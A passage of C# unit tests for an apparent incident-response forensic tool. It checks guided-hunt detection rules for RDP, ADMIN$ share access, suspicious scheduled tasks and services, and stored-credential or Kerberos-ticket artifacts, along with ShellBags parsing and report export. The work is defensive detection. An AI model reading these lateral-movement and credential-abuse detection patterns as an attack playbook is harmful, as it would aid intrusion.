            return item.Hosts.Count == 2 && item.FactCount == 2 && string.Equals(item.DisplayValue, "10.0.0.5", StringComparison.OrdinalIgnoreCase);
        }

        private static bool GuidedHuntPack_matches_rdp_and_admin_share_rules()
        {
            DateTime t1 = new DateTime(2026, 4, 8, 10, 0, 0, DateTimeKind.Utc);
            DateTime t2 = t1.AddMinutes(2);
            CaseData host = CreateSyntheticCase(
                "HostA",
                CreateFact("GH1", t1, "LogonSession", "RemoteInteractiveSessionObserved", "User", @"CONTOSO\alice", "Workstation", "WS-01"),
                CreateFact("GH2", t2, "ServerConnection", "ServerShareConnectionObserved", "User", @"CONTOSO\alice", "ShareName", "ADMIN$", "RemoteName", "10.10.10.20"));

            GuidedHuntResult result = GuidedHuntPack.Evaluate(host, true);
            if (result == null || !result.Enabled)
                return false;

            bool hasRdp = result.RuleMatches.Any(r =>
                r != null &&
                string.Equals(r.Id, "GH-RDP-001", StringComparison.Ordinal) &&
                string.Equals(r.AttackTechniqueId, "T1021.001", StringComparison.Ordinal) &&
                string.Equals(r.SuggestedHypothesisId, "GH-HYP-RDP", StringComparison.Ordinal));
            bool hasSmb = result.RuleMatches.Any(r =>
                r != null &&
                string.Equals(r.Id, "GH-SMB-001", StringComparison.Ordinal) &&
                string.Equals(r.AttackTechniqueId, "T1021.002", StringComparison.Ordinal) &&
                string.Equals(r.SuggestedHypothesisId, "GH-HYP-SMB", StringComparison.Ordinal));
            bool hasRdpHypothesis = result.HypothesisTemplates.Any(h => h != null && string.Equals(h.Id, "GH-HYP-RDP", StringComparison.Ordinal));
            bool hasSmbHypothesis = result.HypothesisTemplates.Any(h => h != null && string.Equals(h.Id, "GH-HYP-SMB", StringComparison.Ordinal));
            return result.FactCountEvaluated == 2 && hasRdp && hasSmb && hasRdpHypothesis && hasSmbHypothesis;
        }

        private static bool GuidedHuntPack_matches_task_service_and_credential_rules()
        {
            DateTime t1 = new DateTime(2026, 4, 8, 11, 0, 0, DateTimeKind.Utc);
            DateTime t2 = t1.AddMinutes(1);
            DateTime t3 = t1.AddMinutes(2);
            DateTime t4 = t1.AddMinutes(3);
            CaseData host = CreateSyntheticCase(
                "HostB",
                CreateFact("GT1", t1, "ScheduledTask", "Scheduled", "TaskName", @"\BadTask", "Path", @"C:\Users\Public\run.cmd"),
                CreateFact("GS1", t2, "Service", "ServiceConfigurationObserved", "ServiceName", "BadSvc", "Path", @"C:\Users\Public\svc.exe"),
                CreateFact("GC1", t3, "EventLog:Security", "ExplicitCredentialUsed", "TargetUser", @"CONTOSO\alice", "TargetServer", "FILE01"),
                CreateFact("GC2", t4, "ServerConnection", "ServerShareConnectionObserved", "User", @"CONTOSO\alice", "ShareName", "ADMIN$", "RemoteName", "FILE01"));

            host.FactStore.BuildEntityIndex();
            GuidedHuntResult result = GuidedHuntPack.Evaluate(host, true);
            if (result == null || !result.Enabled)
                return false;

            bool hasTask = result.RuleMatches.Any(r => r != null && string.Equals(r.Id, "GH-TASK-001", StringComparison.Ordinal) && string.Equals(r.AttackTechniqueId, "T1053.005", StringComparison.Ordinal));
            bool hasService = result.RuleMatches.Any(r => r != null && string.Equals(r.Id, "GH-SVC-001", StringComparison.Ordinal) && string.Equals(r.AttackTechniqueId, "T1543.003", StringComparison.Ordinal));
            bool hasCredential = result.RuleMatches.Any(r => r != null && string.Equals(r.Id, "GH-CRED-001", StringComparison.Ordinal) && string.Equals(r.AttackTechniqueId, "T1078", StringComparison.Ordinal));
            bool hasTaskHypothesis = result.HypothesisTemplates.Any(h => h != null && string.Equals(h.Id, "GH-HYP-TASK", StringComparison.Ordinal));
            bool hasServiceHypothesis = result.HypothesisTemplates.Any(h => h != null && string.Equals(h.Id, "GH-HYP-SVC", StringComparison.Ordinal));
            bool hasCredentialHypothesis = result.HypothesisTemplates.Any(h => h != null && string.Equals(h.Id, "GH-HYP-CRED", StringComparison.Ordinal));
            return hasTask && hasService && hasCredential && hasTaskHypothesis && hasServiceHypothesis && hasCredentialHypothesis;
        }

        private static bool GuidedHuntPack_matches_cmdkey_and_klist_artifacts()
        {
            DateTime t1 = new DateTime(2026, 4, 9, 1, 0, 0, DateTimeKind.Utc);
            DateTime t2 = t1.AddMinutes(1);
            DateTime t3 = t1.AddMinutes(2);
            CaseData host = CreateSyntheticCase(
                "HostC",
                CreateFact("SC1", t1, "StoredCredential", "StoredCredentialObserved", "User", @"CONTOSO\\alice", "CredentialTarget", "Domain:target=TERMSRV/FILE01", "TargetServer", "FILE01", "Workstation", "FILE01"),
                CreateFact("KT1", t2, "KerberosTicketCache", "KerberosTicketCached", "User", "alice", "ServiceName", "cifs/FILE01.contoso.local @ CONTOSO.LOCAL", "TargetServer", "FILE01.contoso.local", "Workstation", "FILE01.contoso.local"),
                CreateFact("NR1", t3, "NetworkResource", "NetworkResourceConnectionObserved", "User", @"CONTOSO\\alice", "RemoteName", @"\\\\FILE01\\Tools", "Workstation", "FILE01", "ShareName", "Tools"));

            host.FactStore.BuildEntityIndex();
            GuidedHuntResult result = GuidedHuntPack.Evaluate(host, true);
            return result != null &&
                result.RuleMatches.Any(r => r != null && string.Equals(r.Id, "GH-CRED-001", StringComparison.Ordinal)) &&
                result.HypothesisTemplates.Any(h => h != null && string.Equals(h.Id, "GH-HYP-CRED", StringComparison.Ordinal));
        }

        private static bool SummaryExport_serialize_preserves_summary_v3_schema()
        {
            var payload = new SummaryPayload
            {
                GeneratedAt = "2026-04-08T10:00:00Z",
                ExportSchema = "summary_v3",
                AnalysisMode = "facts_only",
                Host = "HostA",
                CaseId = "CaseA",
                CollectionCoverage = new CollectionCoverageReport { OverallStatus = "partial", Host = "HostA", Steps = new List<CollectionCoverageStep>() },
                MemoryAcquisition = new MemoryAcquisitionRecord { Status = "skipped", Detail = "not configured" },
                MemoryAnalysis = new MemoryAnalysisRecord { Status = "skipped", Detail = "not configured" },
                FactSourceCounts = new Dictionary<string, int> { { "EventLog:Security", 2 } },
                EntityTypeCounts = new Dictionary<string, int> { { "Path", 1 } },
                ParserNotes = new List<string> { "note" },
                FactSamples = new List<Fact>()
            };

            payload.CollectionModeProfile = CollectionModeProfileHelper.TriageFast;
            string json = SummaryExport.Serialize(payload);
            return json.IndexOf("\"export_schema\":\"summary_v3\"", StringComparison.OrdinalIgnoreCase) >= 0
                && json.IndexOf("\"analysis_mode\":\"facts_only\"", StringComparison.OrdinalIgnoreCase) >= 0
                && json.IndexOf("\"collection_mode_profile\":\"TriageFast\"", StringComparison.Ordinal) >= 0
                && json.IndexOf("\"memory_acquisition\"", StringComparison.OrdinalIgnoreCase) >= 0
                && json.IndexOf("\"memory_analysis\"", StringComparison.OrdinalIgnoreCase) >= 0
                && json.IndexOf("\"collection_coverage\"", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static bool SummaryExport_serialize_handles_minvalue_fact_time()
        {
            var payload = new SummaryPayload
            {
                GeneratedAt = "2026-04-08T10:05:00Z",
                ExportSchema = "summary_v3",
                AnalysisMode = "facts_only",
                Host = "HostA",
                CaseId = "CaseA",
                FactSamples = new List<Fact>
                {
                    CreateFact("A1", DateTime.MinValue, "Amcache", "Observed", "Path", @"C:\Temp\bad.exe")
                },
                ParserNotes = new List<string> { "note" }
            };
            payload.FactSamples[0].ParserNote = "Time unavailable; parser note should survive summary export.";
            payload.FactSamples[0].FallbackUsed = true;

            string json = SummaryExport.Serialize(payload);
            return !string.IsNullOrWhiteSpace(json) &&
                json.IndexOf("\"fact_samples\"", StringComparison.OrdinalIgnoreCase) >= 0 &&
                json.IndexOf("bad.exe", StringComparison.OrdinalIgnoreCase) >= 0;
        }

        private static bool SummaryExport_serialize_includes_guided_hunt()
        {
            var payload = new SummaryPayload
            {
                GeneratedAt = "2026-04-08T10:06:00Z",
                ExportSchema = "summary_v3",
                AnalysisMode = "facts_only",
                Host = "HostA",
                CaseId = "CaseA",
                GuidedHunt = new GuidedHuntResult
                {
                    Enabled = true,
                    Host = "HostA",
                    FactCountEvaluated = 2,
                    RuleMatches = new List<GuidedHuntRuleMatch>
                    {
                        new GuidedHuntRuleMatch
                        {
                            Id = "GH-RDP-001",
                            Title = "Remote interactive logon session observed",
                            AttackTechniqueId = "T1021.001"
                        }
                    },
                    HypothesisTemplates = new List<GuidedHuntHypothesisTemplate>
                    {
                        new GuidedHuntHypothesisTemplate
                        {
                            Id = "GH-HYP-RDP",
                            Title = "Validate remote desktop usage"
                        }
                    }
                },
                FactSamples = new List<Fact>()
            };

            string json = SummaryExport.Serialize(payload);
            return json.IndexOf("\"guided_hunt\"", StringComparison.OrdinalIgnoreCase) >= 0 &&
                json.IndexOf("\"GH-RDP-001\"", StringComparison.Ordinal) >= 0 &&
                json.IndexOf("\"GH-HYP-RDP\"", StringComparison.Ordinal) >= 0;
        }

        private static bool ParserNoteSummary_includes_non_amcache_sources()
        {
            var facts = new List<Fact>();
            Fact usnFact = CreateFact("U1", DateTime.MinValue, "USN", "Observed", "Path", @"C:\Temp\a.txt");
            usnFact.ParserNote = "USN row lacked a stable full path.";
            usnFact.FallbackUsed = true;
            facts.Add(usnFact);

            Fact shimFact = CreateFact("S1", DateTime.MinValue, "ShimCache", "Observed", "Path", @"C:\Temp\b.exe");
            shimFact.ParserNote = "Path reconstructed from ShimCache binary entry stream.";
            shimFact.FallbackUsed = true;
            facts.Add(shimFact);

            List<string> notes = ParserNoteSummaryBuilder.BuildFactParserNoteLines(facts, 10);
            return notes.Any(v => v.IndexOf("USN note: USN row lacked a stable full path.", StringComparison.OrdinalIgnoreCase) >= 0) &&
                notes.Any(v => v.IndexOf("ShimCache note: Path reconstructed from ShimCache binary entry stream.", StringComparison.OrdinalIgnoreCase) >= 0);
        }

        private static bool SummaryTab_includes_parser_notes_section()
        {
            MainForm form = null;
            CaseData host = null;
            try
            {
                Fact usnFact = CreateFact("U1", DateTime.MinValue, "USN", "Observed", "Path", @"C:\Temp\a.txt");
                usnFact.ParserNote = "USN row lacked a stable full path.";
                usnFact.FallbackUsed = true;
                host = CreateSyntheticCase("HostA", usnFact);

                form = new MainForm();
                TabPage tab = InvokeCreateSummaryTab(form, host);
                TextBox box = FindDescendantControl<TextBox>(tab);
                string text = box != null ? (box.Text ?? "") : "";
                return text.IndexOf("Parser Notes:", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    text.IndexOf("USN note: USN row lacked a stable full path.", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                if (form != null) form.Dispose();
                if (host != null) TryDeleteDir(host.ExtractPath);
            }
        }

        private static bool Summary_and_html_include_forensic_policy_metadata()
        {
            MainForm form = null;
            CaseData host = null;
            try
            {
                host = CreateSyntheticCase("HostA");
                host.CollectionCoverage = new CollectionCoverageReport
                {
                    OverallStatus = "partial",
                    CollectionModeProfile = CollectionModeProfileHelper.ForensicStrict,
                    OperatorAcknowledgedRisks = true,
                    OutputTargetClass = CollectionImpactPolicy.OutputSystemDisk,
                    RestrictedSteps = new List<string> { CollectionImpactPolicy.DeepScanStep },
                    SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep
                        {
                            Step = CollectionImpactPolicy.MemoryAcquisitionStep,
                            Status = "skipped",
                            Detail = "Skipped by ForensicStrict profile.",
                            ArtifactsPresent = new List<string>(),
                            ArtifactsMissing = new List<string>()
                        }
                    }
                };

                form = new MainForm();
                TabPage tab = InvokeCreateSummaryTab(form, host);
                TextBox box = FindDescendantControl<TextBox>(tab);
                string text = box != null ? (box.Text ?? "") : "";
                string html = InvokeBuildHtmlReport(form, host);
                return text.IndexOf("Output target class: system_disk", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    text.IndexOf("Operator acknowledged live-response risks: yes", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    text.IndexOf("Skipped by profile: Memory acquisition", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    html.IndexOf("<b>Output target class:</b> system_disk", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    html.IndexOf("<b>Skipped by profile:</b> Memory acquisition", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                if (form != null) form.Dispose();
                if (host != null) TryDeleteDir(host.ExtractPath);
            }
        }

        private static bool HtmlReport_missing_artifact_counts_render_not_found()
        {
            MainForm form = null;
            CaseData host = null;
            try
            {
                host = CreateSyntheticCase("HostA");
                host.CaseID = "CaseA";
                form = new MainForm();
                string html = InvokeBuildHtmlReport(form, host);
                return html.IndexOf("<td>Services</td><td>(not found)</td>", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    html.IndexOf("<td>-1</td>", StringComparison.OrdinalIgnoreCase) < 0;
            }
            finally
            {
                if (form != null) form.Dispose();
                if (host != null) TryDeleteDir(host.ExtractPath);
            }
        }

        private static bool SummaryPayload_missing_artifact_counts_are_zero()
        {
            MainForm form = null;
            CaseData host = null;
            try
            {
                host = CreateSyntheticCase("HostA");
                host.CaseID = "CaseA";
                form = new MainForm();
                SummaryPayload payload = InvokeBuildSummaryPayload(form, host);
                if (payload == null || payload.Counts == null) return false;
                return payload.Counts.ContainsKey("services") &&
                    payload.Counts.ContainsKey("scheduled_tasks") &&
                    payload.Counts.ContainsKey("shellbags") &&
                    payload.Counts["services"] == 0 &&
                    payload.Counts["scheduled_tasks"] == 0 &&
                    payload.Counts["shellbags"] == 0;
            }
            finally
            {
                if (form != null) form.Dispose();
                if (host != null) TryDeleteDir(host.ExtractPath);
            }
        }

        private static bool ShellBagsParser_DecodeShellItemBlob_ascii_segment()
        {
            byte[] bytes = new byte[] { 0x0a, 0x00, 0x31, (byte)'T', (byte)'e', (byte)'s', (byte)'t', 0x00, 0x00, 0x00 };
            var dec = ShellBagsParser.DecodeShellItemBlob(bytes);
            return dec != null && string.Equals(dec.Path, "Test", StringComparison.Ordinal);
        }

        private static bool ShellBagsParser_TryEnsureShellBagsCsv_writes_csv()
        {
            string root = CreateTempDir("IRCollectShellBags_");
            try
            {
                string regDir = Path.Combine(root, "Registry");
                Directory.CreateDirectory(regDir);
                string regPath = Path.Combine(regDir, "ShellBags_S-1-5-21-111.reg");
                var sb = new StringBuilder();
                sb.AppendLine("Windows Registry Editor Version 5.00");
                sb.AppendLine();
                sb.AppendLine("[HKEY_USERS\\S-1-5-21-111\\SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU\\0]");
                sb.AppendLine("\"1\"=hex:0a,00,31,54,65,73,74,00,00,00");
                File.WriteAllText(regPath, sb.ToString(), new UTF8Encoding(false));
                string detail;
                int n = ShellBagsParser.TryEnsureShellBagsCsv(root, true, out detail);
                string csv = Path.Combine(regDir, ArtifactNames.ShellBagsCsv);
                if (n <= 0 || !File.Exists(csv)) return false;
                string text = File.ReadAllText(csv, Encoding.UTF8);
                return text.IndexOf("DecodedPath", StringComparison.OrdinalIgnoreCase) >= 0
                    && text.IndexOf("Test", StringComparison.Ordinal) >= 0;
            }
            finally
            {
                TryDeleteDir(root);
            }
        }

        private static bool ShellBags_ReadLogicalLines_hex_continuation_strips_backslashes()
        {
            string sample =
                "Windows Registry Editor Version 5.00\r\n\r\n" +
                "[HKEY_USERS\\S-1-5-21\\Shell\\BagMRU\\0]\r\n" +
                "\"1\"=hex:0a,00,\\\r\n" +
                "  31,54,65,73,74,00,\\\r\n" +
                "  00,00\r\n";
            List<string> lines = ShellBagsParser.ReadLogicalLinesFromText(sample);
            bool hasMergedHex = false;
            foreach (string line in lines)
            {
                if (line == null || line.IndexOf("\"1\"=hex:", StringComparison.Ordinal) < 0) continue;
                if (line.IndexOf('\\') >= 0) return false;
                if (line.IndexOf("\"1\"=hex:0a,00,31,54,65,73,74,00,00,00", StringComparison.Ordinal) >= 0)
                    hasMergedHex = true;
            }
            return hasMergedHex;
        }

        private static bool ShellBagsParser_TryEnsureShellBagsCsv_multiline_hex_decodes_path()
        {
            string root = CreateTempDir("IRCollectShellBagsML_");
            try
            {
                string regDir = Path.Combine(root, "Registry");
                Directory.CreateDirectory(regDir);
                string regPath = Path.Combine(regDir, "ShellBags_S-1-5-21-ml.reg");
                var sb = new StringBuilder();
                sb.AppendLine("Windows Registry Editor Version 5.00");
                sb.AppendLine();
                sb.AppendLine("[HKEY_USERS\\S-1-5-21-ml\\SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU\\0]");
                sb.AppendLine("\"1\"=hex:0a,00,\\");
                sb.AppendLine("  31,54,65,73,74,00,\\");
                sb.AppendLine("  00,00");
                File.WriteAllText(regPath, sb.ToString(), new UTF8Encoding(false));
                string detail;
                int n = ShellBagsParser.TryEnsureShellBagsCsv(root, true, out detail);
                string csv = Path.Combine(regDir, ArtifactNames.ShellBagsCsv);
                if (n <= 0 || !File.Exists(csv)) return false;
                string text = File.ReadAllText(csv, Encoding.UTF8);
                return text.IndexOf("Test", StringComparison.Ordinal) >= 0;
            }
            finally
            {
                TryDeleteDir(root);
            }
        }

        private static bool ShellBagsParser_BagsShell_key_without_Shell_segment()
        {
            string root = CreateTempDir("IRCollectShellBagsBags_");
            try
            {
                string regDir = Path.Combine(root, "Registry");
                Directory.CreateDirectory(regDir);
                string regPath = Path.Combine(regDir, "ShellBags_S-1-5-21-bags.reg");
                var sb = new StringBuilder();
                sb.AppendLine("Windows Registry Editor Version 5.00");
                sb.AppendLine();
                sb.AppendLine("[HKEY_USERS\\S-1-5-21-bags\\Software\\Microsoft\\Windows\\Bags\\7\\Shell]");
                sb.AppendLine("\"Shell\"=hex:0a,00,31,42,61,67,73,00,00,00");
                File.WriteAllText(regPath, sb.ToString(), new UTF8Encoding(false));
                string detail;
                int n = ShellBagsParser.TryEnsureShellBagsCsv(root, true, out detail);
                string csv = Path.Combine(regDir, ArtifactNames.ShellBagsCsv);
                if (n <= 0 || !File.Exists(csv)) return false;
                string text = File.ReadAllText(csv, Encoding.UTF8);
                return text.IndexOf("Bags", StringComparison.Ordinal) >= 0
                    && text.IndexOf("BagMRU", StringComparison.OrdinalIgnoreCase) < 0;
            }
            finally
            {
                TryDeleteDir(root);
            }
        }

        private static bool ShellBagsParser_BagsShellNoRoam_key()
        {
            string root = CreateTempDir("IRCollectShellBagsNR_");
            try
            {
                string regDir = Path.Combine(root, "Registry");
                Directory.CreateDirectory(regDir);
                string regPath = Path.Combine(regDir, "ShellBags_S-1-5-21-bags.reg");
                var sb = new StringBuilder();
                sb.AppendLine("Windows Registry Editor Version 5.00");
                sb.AppendLine();
                sb.AppendLine("[HKEY_USERS\\S-1-5-21-bags\\Software\\Microsoft\\Windows\\Bags\\7\\ShellNoRoam]");
                sb.AppendLine("\"Shell\"=hex:0a,00,31,5a,5a,00,00,00,00,00");
                File.WriteAllText(regPath, sb.ToString(), new UTF8Encoding(false));
                string detail;
                int n = ShellBagsParser.TryEnsureShellBagsCsv(root, true, out detail);
                string csv = Path.Combine(regDir, ArtifactNames.ShellBagsCsv);
                if (n <= 0 || !File.Exists(csv)) return false;
                string text = File.ReadAllText(csv, Encoding.UTF8);
                return text.IndexOf("ShellNoRoam", StringComparison.OrdinalIgnoreCase) >= 0
                    && text.IndexOf("ZZ", StringComparison.Ordinal) >= 0;
            }
            finally
            {
                TryDeleteDir(root);
            }
        }

        private static bool ShellBagsNormalizer_ToFacts_maps_path_user_sid()
        {
            string dir = CreateTempDir("IRCollectShellBagsNorm_");
            try
            {
                string csv = Path.Combine(dir, ArtifactNames.ShellBagsCsv);
                File.WriteAllText(csv,
                    "Sid,User,BagPath,RegistryKey,ValueName,DecodedPath,MruSlot,LastWriteTime,ParserNote,SourceFile\r\n" +
                    "S-1-5-21-1,S-1-5-21-1,0,,1,TestPath,1,2026-04-08T10:00:00Z,,ShellBags_x.reg\r\n",
                    new UTF8Encoding(false));
                List<Fact> facts = ShellBagsNormalizer.ToFacts(csv);
                if (facts == null || facts.Count != 1) return false;
                Fact f = facts[0];
                if (!string.Equals(f.Action, "FolderBrowsed", StringComparison.Ordinal)) return false;
                if (!string.Equals(f.Source, ShellBagsNormalizer.SourceName, StringComparison.Ordinal)) return false;
                bool hasPath = f.EntityRefs != null && f.EntityRefs.Any(e => e != null && e.Type == "Path" && e.Value == "TestPath");
                bool hasUser = f.EntityRefs != null && f.EntityRefs.Any(e => e != null && e.Type == "User" && e.Value == "S-1-5-21-1");
                bool hasSid = f.EntityRefs != null && f.EntityRefs.Any(e => e != null && e.Type == "Sid" && e.Value == "S-1-5-21-1");
                return hasPath && hasUser && hasSid && FactTimeMetadata.HasUsableTime(f.Time);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool TimelineFilter_helpers_honor_minute_precision()
        {
            DateTime value = new DateTime(2026, 4, 8, 10, 15, 42, DateTimeKind.Local);
            DateTime from = MainForm.NormalizeTimelineFilterStart(value);
            DateTime to = MainForm.NormalizeTimelineFilterEnd(value);
            return from == new DateTime(2026, 4, 8, 10, 15, 0, DateTimeKind.Local) &&
                to > new DateTime(2026, 4, 8, 10, 15, 59, 998, DateTimeKind.Local) &&
                to < new DateTime(2026, 4, 8, 10, 16, 0, DateTimeKind.Local);
        }

        private static bool TimelineGraphFocus_matches_entity_refs_before_text_fallback()
        {
            var evt = new MainForm.TimelineEvent
            {
                Time = new DateTime(2026, 4, 8, 10, 0, 0, DateTimeKind.Utc),
                Source = "EventLog:Security",
                Type = "Logon",
                Description = "Unrelated description",
                EntityRefs = new List<EntityRef> { new EntityRef("RemoteIP", "10.0.0.5") }
            };
            bool structuredMatch = MainForm.TimelineEventMatchesGraphFocus(evt, "RemoteIP", "10.0.0.5", "10.0.0.5");

            var fallbackEvt = new MainForm.TimelineEvent
            {
                Time = new DateTime(2026, 4, 8, 10, 1, 0, DateTimeKind.Utc),
                Source = "Activity",
                Type = "Note",
                Description = "contains 10.0.0.5 in plain text",
                EntityRefs = new List<EntityRef>()
            };
            bool textFallbackMatch = MainForm.TimelineEventMatchesGraphFocus(fallbackEvt, "RemoteIP", "10.0.0.5", "10.0.0.5");

            return structuredMatch && textFallbackMatch;
        }

        private static bool FullLogExportJson_includes_memory_and_freshness_host_fields()
        {
            string dir = CreateTempDir("IRCollectFullLogExport_");
            try
            {
                DateTime t1 = new DateTime(2026, 4, 8, 10, 0, 0, DateTimeKind.Utc);
                CaseData host = CreateSyntheticCase("HostA", CreateFact("A1", t1, "EventLog:Security", "ProcessCreated", "Path", @"C:\Temp\bad.exe", "User", @"CONTOSO\alice"));
                host.CaseID = "CaseA";
                host.LoadWarnings.Add("sample warning");
                host.CollectionCoverage = new CollectionCoverageReport
                {
                    OverallStatus = "partial",
                    Host = "HostA",
                    CollectionModeProfile = CollectionModeProfileHelper.ForensicStrict,
                    OperatorAcknowledgedRisks = true,
                    OutputTargetClass = CollectionImpactPolicy.OutputSystemDisk,
                    RestrictedSteps = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
                    SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
                    Steps = new List<CollectionCoverageStep>()
                };
                host.FactStoreFreshnessStatus = "current";
                host.FactStoreFreshnessDetail = "cache is current";
                host.MemoryAcquisitionMeta = new MemoryAcquisitionRecord { Status = "skipped", Detail = "not configured" };
                host.MemoryAnalysisMeta = new MemoryAnalysisRecord { Status = "skipped", Detail = "not configured" };

                string outputPath = Path.Combine(dir, "full_log.json");
                FactStorePersistence.ExportFullLogJson(new[] { host }, outputPath);
                string json = File.ReadAllText(outputPath, Encoding.UTF8);

                return json.IndexOf("\"export_schema\":\"full_log_v3\"", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("\"collection_mode_profile\":\"ForensicStrict\"", StringComparison.Ordinal) >= 0
                    && json.IndexOf("\"memory_acquisition\"", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("\"memory_analysis\"", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("\"collection_coverage_status\":\"partial\"", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("\"operator_acknowledged_risks\":true", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("\"output_target_class\":\"system_disk\"", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("\"restricted_steps\":[\"Memory acquisition\"]", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("\"skipped_by_profile\":[\"Memory acquisition\"]", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("\"fact_store_freshness_status\":\"current\"", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("Memory handoff:", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("[Reconciled]", StringComparison.OrdinalIgnoreCase) >= 0
                    && json.IndexOf("[Coverage]", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static CollectionCoverageStep InvokeBuildMemoryAcquisitionCoverageStep(string outputDir, List<string> failedSteps)
        {
            MethodInfo method = typeof(Collector).GetMethod("BuildMemoryAcquisitionCoverageStep", BindingFlags.NonPublic | BindingFlags.Static);
            if (method == null) throw new InvalidOperationException("Collector.BuildMemoryAcquisitionCoverageStep not found.");
            object value = method.Invoke(null, new object[] { outputDir, failedSteps });
            return value as CollectionCoverageStep;
        }

        private static TabPage InvokeCreateSummaryTab(MainForm form, CaseData c)
        {
            MethodInfo method = typeof(MainForm).GetMethod("CreateSummaryTab", BindingFlags.NonPublic | BindingFlags.Instance);
            if (method == null) throw new InvalidOperationException("MainForm.CreateSummaryTab not found.");
            object value = method.Invoke(form, new object[] { c });
            return value as TabPage;
        }

        private static string InvokeBuildHtmlReport(MainForm form, CaseData c)
        {
            MethodInfo method = typeof(MainForm).GetMethod("BuildHtmlReport", BindingFlags.NonPublic | BindingFlags.Instance);
            if (method == null) throw new InvalidOperationException("MainForm.BuildHtmlReport not found.");
            object value = method.Invoke(form, new object[] { c });
            return value as string;
        }

        private static SummaryPayload InvokeBuildSummaryPayload(MainForm form, CaseData c)
        {
            MethodInfo method = typeof(MainForm).GetMethod("BuildSummaryPayload", BindingFlags.NonPublic | BindingFlags.Instance);
            if (method == null) throw new InvalidOperationException("MainForm.BuildSummaryPayload not found.");
            object value = method.Invoke(form, new object[] { c });
            return value as SummaryPayload;
        }

        private static T FindDescendantControl<T>(Control root) where T : Control
        {
            if (root == null) return null;
            T typed = root as T;
            if (typed != null) return typed;
            foreach (Control child in root.Controls)
            {
                T found = FindDescendantControl<T>(child);
                if (found != null) return found;
            }
            return null;
        }

        private static CollectionCoverageStep InvokeBuildMemoryAnalysisCoverageStep(string outputDir, List<string> failedSteps)
        {
            MethodInfo method = typeof(Collector).GetMethod("BuildMemoryAnalysisCoverageStep", BindingFlags.NonPublic | BindingFlags.Static);
            if (method == null) throw new InvalidOperationException("Collector.BuildMemoryAnalysisCoverageStep not found.");
            object value = method.Invoke(null, new object[] { outputDir, failedSteps });
            return value as CollectionCoverageStep;
        }

        private static CollectionCoverageStep InvokeBuildExecutionArtifactsCoverageStep(string outputDir, List<string> failedSteps)
        {
            MethodInfo method = typeof(Collector).GetMethod("BuildExecutionArtifactsCoverageStep", BindingFlags.NonPublic | BindingFlags.Static);
            if (method == null) throw new InvalidOperationException("Collector.BuildExecutionArtifactsCoverageStep not found.");
            object value = method.Invoke(null, new object[] { outputDir, failedSteps });
            return value as CollectionCoverageStep;
        }

        private static CollectionCoverageStep InvokeBuildEventLogCoverageStep(string outputDir, List<string> failedSteps)
        {
            MethodInfo method = typeof(Collector).GetMethod("BuildEventLogCoverageStep", BindingFlags.NonPublic | BindingFlags.Static);
            if (method == null) throw new InvalidOperationException("Collector.BuildEventLogCoverageStep not found.");
            object value = method.Invoke(null, new object[] { outputDir, failedSteps });
            return value as CollectionCoverageStep;
        }

        private static CollectionCoverageReport InvokeBuildCollectionCoverageReport(string outputDir, string evidenceId, List<string> failedSteps, string collectionModeProfile)
        {
            MethodInfo method = typeof(Collector).GetMethod(
                "BuildCollectionCoverageReport",
                BindingFlags.NonPublic | BindingFlags.Static,
                null,
                new Type[] { typeof(string), typeof(string), typeof(List<string>), typeof(string) },
                null);
            if (method == null) throw new InvalidOperationException("Collector.BuildCollectionCoverageReport not found.");
            object value = method.Invoke(null, new object[] { outputDir, evidenceId, failedSteps, collectionModeProfile ?? CollectionModeProfileHelper.Standard });
            return value as CollectionCoverageReport;
        }

        private static bool CollectionModeProfile_normalize_and_cases()
        {
            return string.Equals(CollectionModeProfileHelper.Normalize(null), CollectionModeProfileHelper.Standard, StringComparison.Ordinal) &&
                string.Equals(CollectionModeProfileHelper.Normalize(" triagefast "), CollectionModeProfileHelper.TriageFast, StringComparison.Ordinal) &&
                string.Equals(CollectionModeProfileHelper.Normalize("FORENSICSTRICT"), CollectionModeProfileHelper.ForensicStrict, StringComparison.Ordinal) &&
                string.Equals(CollectionModeProfileHelper.Normalize("nope"), CollectionModeProfileHelper.Standard, StringComparison.Ordinal);
        }

        private static bool CollectionModeProfile_forensic_strict_blocks_outbound_helpers()
        {
            var cfg = new ConfigManager();
            cfg.Set("CollectionModeProfile", CollectionModeProfileHelper.ForensicStrict);
            return CollectionModeProfileHelper.BlocksAiAnalyze(cfg) && CollectionModeProfileHelper.BlocksOutboundZipUpload(cfg);
        }

        private static bool CollectionModeProfile_standard_allows_outbound_helpers()
        {
            var cfg = new ConfigManager();
            cfg.Set("CollectionModeProfile", CollectionModeProfileHelper.Standard);
            return !CollectionModeProfileHelper.BlocksAiAnalyze(cfg) && !CollectionModeProfileHelper.BlocksOutboundZipUpload(cfg);
        }

        private static bool CollectionCoverage_report_includes_mode_profile()
        {
            string dir = CreateTempDir("IRCollectCoverProfile_");
            try
            {
